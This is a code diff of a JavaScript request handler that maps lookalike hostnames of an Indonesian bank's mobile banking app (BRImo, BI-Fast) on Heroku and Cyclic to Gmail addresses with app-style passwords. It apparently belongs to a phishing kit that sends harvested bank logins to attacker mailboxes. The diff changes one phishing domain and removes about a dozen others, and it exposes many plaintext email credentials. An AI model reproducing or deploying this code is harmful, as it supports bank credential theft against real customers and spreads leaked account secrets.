@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if (url == 'bri--mo--app.herokuapp.com'){
+    if (url == 'brimo-app.cyclic.app'){
 
         email = 'lagi3132@gmail.com';
         pass = 'rqvxojgehhtvzrip';
@@ -17,56 +17,7 @@ export default function handler(req, res) {
         email = 'impianbarub@gmail.com';
         pass = 'rofndibfsscucshv';
 
-    } else if (url == 'bif-as-app-brmo.herokuapp.com'){
-        email = 'rumahbarubaru443@gmail.com';
-        pass = 'lssxwneekjuwlvgt';
-
-    }
-    else if (url == 'new--promo-tarif.herokuapp.com'){
-        email = 'ayamperu233@gmail.com';
-        pass = 'rtzqphftdjkdrnwa';
-        
-    }
-    else if (url == 'log-in-bri.herokuapp.com'){
-        email = 'nilabakar403@gmail.com';
-        pass = 'hpwgbnwdgdpryjpa';
-        
-    }
-    else if (url == 'log-brlmoo-bifas.herokuapp.com'){
-        email = 'hayabusa20202030@gmail.com';
-        pass = 'vfwfryjcovpoyqtt';
-        
-
-    }
-    else if (url == 'bri-mo-news.herokuapp.com'){
-        email = 'samesenangtobo14@gmail.com';
-        pass = 'iebkxjlpwrdfubjf';
-        
-
-    }
-    else if (url == 'brimo-daftar-bi-fast.herokuapp.com'){
-    email = 'agustusq76@gmail.com';
-    pass = 'xbohxjweimfcuhpx';
    
-    }
-    else if (url == ' bri-mo-bifas.herokuapp.com'){
-        email = 'aliakbarbar101@gmail.com';
-        pass = 'ywmrzlrlcvssjkhu';
-       
-    }
-    else if (url == 'app-brimo-bifasttt.herokuapp.com'){
-        email = 'lupa10203070@gmail.com';
-        pass = 'xwnxmsljgdwgtcva';
-       
-    }
-    else if (url == 'bl-fast-brimo-login.herokuapp.com'){
-        email = 'derid1028@gmail.com';
-        pass = 'fzntnluddmuahidw';
-       
-    }
-    else if (url == 'daf-tar--brimo.herokuapp.com'){
-        email = 'namakuubri@gmail.com';
-        pass = 'acfrtsnasoaccdnt';
            
         }
         
